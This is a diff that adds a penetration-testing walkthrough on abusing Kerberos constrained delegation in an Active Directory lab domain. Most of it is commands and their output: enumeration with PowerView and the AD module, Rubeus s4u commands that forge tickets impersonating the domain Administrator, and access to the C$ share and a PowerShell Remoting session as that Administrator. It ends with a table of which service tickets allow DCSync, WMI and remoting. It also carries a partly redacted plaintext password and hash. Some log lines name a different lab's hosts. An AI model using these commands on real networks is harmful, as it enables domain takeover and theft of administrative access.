@@ -1,0 +1,309 @@
+=======================================================================================================================================
+Abusing Kerberos Constrained Delegation in Active Directory
+=======================================================================================================================================
+
+=> If you have compromised a user/service account or a computer account that has kerberos constrained delegation enabled, it's possible to impersonate
+   any domain user (including domain administrator) and authenticate to a service that the user account is trusted to delegate to.
+
+
+=======================================================================================================================================
+PoC - Step 1. Enumerate user/service accounts and computer accounts that have kerberos constrained delegation enabled
+=======================================================================================================================================
+
+There are several commands and tools that can be used during the Domain enumeration phase to identify accounts that have kerberos constrained delegation enabled:
+
+=> BloodHound
+=> PingCastle
+=> ADcollector
+
+=> ADRecon.ps1
+   Review the files 'Users.csv' and 'Computers.csv' and look for user/service accounts and computer accounts that have kerberos constrained delegation enabled
+   
+   Example - Extract for the file 'Users.csv'
+   
+    UserName	    Name		        Enabled	Delegation Permitted	Delegation Type		Delegation Protocol		Delegation Services	Logon 							
+    -------------------------------------------------------------------------------------------------------------------------------------------------------------------
+    svcwebadmin		webserver svc		TRUE	  TRUE					        Constrained			  Any						        CIFS/dbserver01.security-test-lab.local, CIFS/dbserver01	
+    <SNIP>
+
+
+=> PowerView_dev
+
+   Commands:
+   Get-DomainUser USER -Properties samaccountname,msds-allowedtodelegateto | select -Expand msds-allowedtodelegateto
+   Get-DomainComputer COMP -Properties samaccountname,msds-allowedtodelegateto | select -Expand msds-allowedtodelegateto
+    
+   Example:
+    PS C:\AD\Tools> . .\PowerView_dev.ps1
+    PS C:\AD\Tools> Get-DomainUser svcwebadmin -Properties samaccountname,msds-allowedtodelegateto | select -Expand msds-allowedtodelegateto
+    CIFS/dbserver01.security-test-lab.local 
+    CIFS/dbserver01	
+
+
+=> Powershell AD-Module
+
+   Commands:
+   Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+   Get-DomainUser -TrustedToAuth
+   Get-DomainComputer -TrustedToAuth
+   
+   Example:
+   PS C:\AD\Tools> Get-DomainUser -TrustedToAuth
+				logoncount               : 16
+				badpasswordtime          : 12/31/1600 4:00:00 PM
+				distinguishedname        : CN=webserver svc,CN=Users,DC=security-test-lab,DC=local
+        <SNIP>
+				userprincipalname        : svcwebadmin
+				name                     : webserver svc
+				objectsid                : S-1-5-21-1874506631-3219982063-538534511-1113
+				samaccountname           : svcwebadmin
+        <SNIP>
+				msds-allowedtodelegateto : {CIFS/dbserver01.security-test-lab.local, CIFS/dbserver01}
+        <SNIP>
+
+
+==========================================================================================================================================================
+PoC - Step 2. Use the account "svcwebadmin" and the tool Rubeus to generate a TGS ticket (CIFS) as a Domain Admin account for the server 'dbserver01'
+              CIFS = Admin access to all the shares
+==========================================================================================================================================================
+
+
+PS C:\AD\jfc-tools> .\Rubeus.exe hash /password:AuD1t2021AuD1t2021!!
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: Calculate Password Hash(es)
+
+[*] Input password             : AuD1t2021AuD1t2021!!<SNIP>
+[*]       rc4_hmac             : CC45GHLI<snip>
+
+
+C:\AD\jfc-tools>Rubeus.exe s4u /user:svcwebadmin /rc4:cc45ghli<snip> /domain:security-test-lab.local /impersonateuser:Administrator /msdsspn:CIFS/dbserver01.security-test-lab.local /dc:192.168.1.50 /ptt /nowrap
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: CC45GHLI<snip>
+[*] Building AS-REQ (w/ preauth) for: 'security-test-lab.local\svcwebadmin'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doI45FSjCABLYCBUagAwIBBaEDAgEWooIENzCCBDNYIJHT1JQ<SNIP>
+
+[*] Action: S4U
+
+[*] Using domain controller: 192.168.1.50
+[*] Building S4U2self request for: 'svcwebadmin@SECURITY-TEST-LAB.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator@SECURITY-TEST-LAB.LOCAL' to 'svcwebadmin@SECURITY-TEST-LAB.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGHDCC67BhigAwIBBaEDAgEWoaoIFATCCBP1hggT5MIIE9aADA<SNIP>
+
+[+] Ticket successfully imported!
+[*] Impersonating user 'Administrator' to target SPN 'CIFS/dbserver01.security-test-lab.local'
+[*] Using domain controller: 192.168.1.50
+[*] Building S4U2proxy request for service: 'CIFS/dbserver01.security-test-lab.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN 'CIFS/dbserver01.security-test-lab.local':
+
+      doIHYzCCB1+gACCBhdhggYTMIIGD6ADAgEFoRwbGVlDT1JQLkxPQ0FMojkwAwLl<SNIP>
+[+] Ticket successfully imported!
+
+C:\AD\jfc-tools>
+
+
+=> Now let's verify that we have full access to the 'C$' share drive of the server 'dbserver01.security-test-lab.local' :-)
+
+C:\AD\jfc-tools>dir \\dbserver01.security-test-lab.local\c$
+ Volume in drive \\dbserver01.security-test-lab.local\c$ has no label.
+ Volume Serial Number is 98C0-23AE
+
+ Directory of \\dbserver01.security-test-lab.local\c$
+
+07/16/2016  06:18 AM    <DIR>          PerfLogs
+02/17/2019  06:19 AM    <DIR>          Program Files
+02/17/2019  06:17 AM    <DIR>          Program Files (x86)
+12/05/2019  10:33 PM    <DIR>          Transcripts
+02/17/2019  06:21 AM    <DIR>          Users
+02/20/2019  04:37 AM    <DIR>          Windows
+               0 File(s)              0 bytes
+               6 Dir(s)   2,717,290,496 bytes free
+
+
+C:\AD\jfc-tools>powershell -exec bypass
+
+PS C:\AD\jfc-tools> cat '\\dbserver01.security-test-lab.local\C$\Windows\win.ini'
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+
+
+=> The account 'svcwebadmin' is not admin of the server 'dbserver01.security-test-lab.local'. We can list the C$ admin share only because of the TGS 
+   that we obtained by exploiting the Kerberos Constrained Delegation.
+
+C:\AD\jfc-tools\CrackMapExecWin>crackmapexec.exe -u svcwebadmin -p AuD1t2021AuD1t2021!!<SNIP> --shares dbserver01.security-test-lab.local
+09-11-2020 15:47:50 [*] dcorp-mssql.dollarcorp.moneycorp.local:445 is running Windows 10.0 Build 14393 (name:dbserver01) (domain:security-test)
+09-11-2020 15:47:50 [+] dcorp-mssql.dollarcorp.moneycorp.local:445 Login successful security-lab\svcwebadmin:AuD1t2021AuD1t2021!!<SNIP>
+09-11-2020 15:47:50 [+] dcorp-mssql.dollarcorp.moneycorp.local:445 Available shares:
+09-11-2020 15:47:50           SHARE     Permissions
+09-11-2020 15:47:50           -----     -----------
+09-11-2020 15:47:50          ADMIN$       NO ACCESS
+09-11-2020 15:47:50            IPC$            READ
+09-11-2020 15:47:50              C$       NO ACCESS
+
+
+
+=> Normally with the CIFS service we should be able to run PSexec... but it did not worked.
+
+PS C:\AD\jfc-tools> .\PsExec.exe \\dbserver01.security-test-lab.local cmd -accepteula
+
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Could not start PSEXESVC service on dbserver01.security-test-lab.local:
+Access is denied.
+
+
+security-lab\Administrator
+
+=============================================================================================================================================================
+PoC - Step 3. Use the account 'svcwebadmin' and the tool Rubeus to generate TGS tickets (HOST,HTTP) as Domain Admin account for the server 'dbserver01'
+              HOST+HTTP = PowerShell Remoting as security-lab\Administrator
+=============================================================================================================================================================
+
+
+PS C:\AD\jfc-tools> .\Rubeus.exe s4u /user:svcwebadmin /rc4:cc45ghli<snip> /domain:security-test-lab.local /impersonateuser:Administrator /msdsspn:CIFS/dbserver01.security-test-lab.local /altservice:HOST,HTTP /dc:192.168.1.50 /ptt /nowrap
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: S4U
+
+[*] Using rc4_hmac hash: CC45GHLI<snip>
+[*] Building AS-REQ (w/ preauth) for: 'security-test-lab.local\svcwebadmin'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doI45FSjCABLYCBUagAwIBBaEDAgEWooIENzCCBDNYIJHT1JQ<SNIP>
+
+[*] Action: S4U
+
+[*] Using domain controller: 192.168.1.50
+[*] Building S4U2self request for: 'svcwebadmin@SECURITY-TEST-LAB.LOCAL'
+[*] Sending S4U2self request
+[+] S4U2self success!
+[*] Got a TGS for 'Administrator@SECURITY-TEST-LAB.LOCAL' to 'svcwebadmin@SECURITY-TEST-LAB.LOCAL'
+[*] base64(ticket.kirbi):
+
+      doIGgpkN0qYIMRx41Tgsk0LoL+rvN4vF6pF2eLIhg42t2p3YZx6pdMPPbM0dLWF5U7dIE<SNIP>
+
+[+] Ticket successfully imported!
+[*] Impersonating user 'Administrator' to target SPN 'CIFS/dbserver01.security-test-lab.local'
+[*]   Final tickets will be for the alternate services 'HOST,HTTP'
+[*] Using domain controller: 192.168.1.50
+[*] Building S4U2proxy request for service: 'CIFS/dbserver01.security-test-lab.local'
+[*] Sending S4U2proxy request
+[+] S4U2proxy success!
+[*] Substituting alternative service name 'HOST'
+[*] base64(ticket.kirbi) for SPN 'HOST/dbserver01.security-test-lab.local':
+
+      doIHuTE9DQUyjggWtMIIFqaADAgESoQMCAQKiggWbBIIFlxrw51AECxbWSaCfvth1Tc9P<SNIP>
+      
+[+] Ticket successfully imported!
+[*] Substituting alternative service name 'HTTP'
+[*] base64(ticket.kirbi) for SPN 'HTTP/dbserver01.security-test-lab.local':
+
+      doIHYzCGFyY29ycC5tb25leWNvcnAuTE9DQUyjggWtMIIFqaADAgESoQMCAQKiggWbBII<SNIP>
+[+] Ticket successfully imported!
+
+PS C:\AD\jfc-tools>
+
+
+=> We use the command KLIST to check if the Kerberos tickets (TGS) have been imported.
+
+PS C:\AD\jfc-tools> klist
+
+Current LogonId is 0:0x3146c
+
+Cached Tickets: (8)
+
+#0>     Client: Administrator @ SECURITY-TEST-LAB.LOCAL
+        Server: HTTP/dbserver01.security-test-lab.local @ SECURITY-TEST-LAB.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 9/12/2020 17:59:18 (local)
+        End Time:   9/13/2020 3:59:18 (local)
+        Renew Time: 9/19/2020 17:59:18 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+
+#1>     Client: Administrator @ SECURITY-TEST-LAB.LOCAL
+        Server: HOST/dbserver01.security-test-lab.local @ SECURITY-TEST-LAB.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 9/12/2020 17:59:18 (local)
+        End Time:   9/13/2020 3:59:18 (local)
+        Renew Time: 9/19/2020 17:59:18 (local)
+        Session Key Type: AES-128-CTS-HMAC-SHA1-96
+        Cache Flags: 0
+        Kdc Called:
+
+#2>     Client: Administrator @ SECURITY-TEST-LAB.LOCAL
+        Server: svcwebadmin @ SECURITY-TEST-LAB.LOCAL
+        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
+        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
+        Start Time: 9/12/2020 17:59:18 (local)
+        End Time:   9/13/2020 3:59:18 (local)
+        Renew Time: 9/19/2020 17:59:18 (local)
+        Session Key Type: RSADSI RC4-HMAC(NT)
+        Cache Flags: 0
+        Kdc Called:
+
+
+=> It worked. We can now log into the server 'dbserver01' as the Domain Admin account 'security-lab\administrator' !!!
+
+PS C:\AD\jfc-tools> Enter-PSSession dbserver01.security-test-lab.local
+
+[dbserver01.security-test-lab.local]: PS C:\Users\Administrator.security-lab\Documents> whoami
+security-lab\administrator
+
+[dbserver01.security-test-lab.local]: PS C:\Users\Administrator.security-lab\Documents> dir
+<SNIP>
+
+
+
+Notes for TGS / services:
+==========================
+CIFS          => allow remote admin access to shares
+HOST + HTTP   => allow PowerShell Remoting
+LDAP          => allow DCsync
+HOST + RPCSS  => allow remote WMI access
+
+
